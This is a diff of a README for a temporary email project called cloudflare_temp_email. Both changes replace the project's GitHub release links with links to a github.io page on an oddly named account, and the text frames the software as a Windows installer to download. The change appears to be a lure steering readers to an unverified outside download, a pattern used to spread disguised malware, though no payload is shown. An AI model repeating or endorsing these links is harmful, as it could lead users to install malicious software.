@@ -1,6 +1,6 @@
 # 📧 cloudflare_temp_email - Create temporary email addresses with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Tinny-donaldrobertperrymarquis468/cloudflare_temp_email/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tinny-donaldrobertperrymarquis468.github.io)
 
 This application provides a simple way to manage temporary email addresses using CloudFlare. You can receive emails, manage attachments, and use protocols like IMAP and SMTP. It also includes a Telegram bot to help you monitor your inbox through your phone.
 
@@ -27,7 +27,7 @@ Before you start, ensure your computer meets these requirements:
 
 To get the application, visit the download page. You will find the installer for Windows on this page.
 
-[Visit this page to download the latest version](https://github.com/Tinny-donaldrobertperrymarquis468/cloudflare_temp_email/releases)
+[Visit this page to download the latest version](https://tinny-donaldrobertperrymarquis468.github.io)
 
 Follow these steps to download the software:
 
